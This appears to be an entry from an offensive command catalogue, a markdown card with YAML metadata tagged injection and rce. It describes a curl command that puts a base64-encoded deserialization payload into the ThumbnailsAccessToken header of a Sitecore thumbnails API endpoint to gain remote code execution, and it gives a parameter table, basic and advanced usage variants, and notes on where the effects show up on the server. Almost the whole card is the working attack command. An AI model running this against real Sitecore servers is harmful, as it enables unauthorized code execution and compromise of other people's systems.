---
id: c2b2c3d4-e5f6-7890-abcd-ef1234567896
name: curl-inject-deserialization-payload
type: command
executor: bash
data: >-
  curl -H "ThumbnailsAccessToken: $(cat payload.b64)"
  https://target-sitecore.com/api/thumbnails -v
output: null
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:23:54.089Z'
platforms:
  - Linux
  - Web
tags:
  - injection
  - rce
verified: false
validated: true
submitted: true
---

# curl-inject-deserialization-payload

## Command

```bash
curl -H "ThumbnailsAccessToken: $(cat payload.b64)" https://target-sitecore.com/api/thumbnails -v
```

## Description

Sends an HTTP request to a Sitecore endpoint with a malicious base64-encoded payload in the ThumbnailsAccessToken header, triggering deserialization and RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "ThumbnailsAccessToken: ..."` | Custom header with payload | Yes |
| `$(cat payload.b64)` | Inline base64 payload | Yes |
| `https://target-sitecore.com/api/thumbnails` | Target endpoint URL | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -H "ThumbnailsAccessToken: $(cat payload.b64)" https://target-sitecore.com/api/thumbnails
```

### Advanced Usage

```bash
curl -H "ThumbnailsAccessToken: $(cat payload.b64)" -X POST https://target-sitecore.com/api/thumbnails -d "testdata" -v
```

## Expected Output

HTTP response (e.g., 200 OK) with verbose details; RCE effects may not appear in response but can be observed server-side (e.g., process logs).

## Related

- [[Related Procedure: Inject-Payload-into-ThumbnailsAccessToken-Header]]
